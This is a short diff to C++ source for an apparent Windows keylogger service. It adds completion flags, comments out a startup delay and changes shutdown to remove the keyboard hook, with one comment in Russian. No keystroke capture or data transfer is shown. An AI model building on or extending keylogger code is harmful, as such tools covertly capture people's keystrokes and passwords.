@@ -53,6 +53,9 @@ using Poco::Path;
 using Poco::FileOutputStream;
 using Poco::DateTimeFormatter;
 
+std::atomic<bool> done(false);
+std::atomic<bool> done_callback(false);
+
 KeyloggerService::KeyloggerService() : _helpRequested(false) {}
 
 
@@ -155,7 +158,7 @@ int KeyloggerService::main(const std::vector<std::string>& args)
         displayHelp();
         return Application::EXIT_OK;
     }
-    std::this_thread::sleep_for(std::chrono::seconds(20));
+    //std::this_thread::sleep_for(std::chrono::seconds(20));
 
     doneEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
@@ -168,8 +171,11 @@ int KeyloggerService::main(const std::vector<std::string>& args)
 
     waitForTerminationRequest();
     // здесь нужно вызвать у HookThread функцию стоп
-    SetEvent(doneEvent);
+    removelKeyboardHookProcess();
 
+    while (!done_callback) {
+        Sleep(500);
+    }
     return Application::EXIT_OK;
 }
 
